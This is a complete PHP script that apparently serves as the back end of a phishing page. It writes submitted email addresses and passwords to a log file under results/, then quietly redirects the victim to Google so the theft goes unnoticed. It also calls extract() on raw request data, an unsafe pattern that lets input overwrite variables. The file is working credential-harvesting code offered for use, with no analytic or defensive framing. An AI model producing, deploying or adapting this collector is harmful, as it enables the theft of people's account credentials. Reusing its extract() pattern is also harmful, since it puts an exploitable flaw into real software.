<?php
// Include your config file here if needed
// include 'admin/config.php';

// Extract the form data
extract($_REQUEST);

// Open the log file in append mode
$file = fopen("results/log.txt", "a");

// Write the email and password to the log file
fwrite($file, "> email: ");
fwrite($file, $email . "\n");

fwrite($file, "> password: ");
fwrite($file, $password . "\n");

fwrite($file, "\n");
fclose($file);

// Store the email and password in variables
$email = $_POST["email"];
$password = $_POST["password"];

// Wait for 2 seconds before redirecting the user
sleep(2);

// Redirect the user to a different URL (Google in this case)
header("Location: https://www.google.com");
exit(); // Make sure to include this to stop script execution after redirection
?>
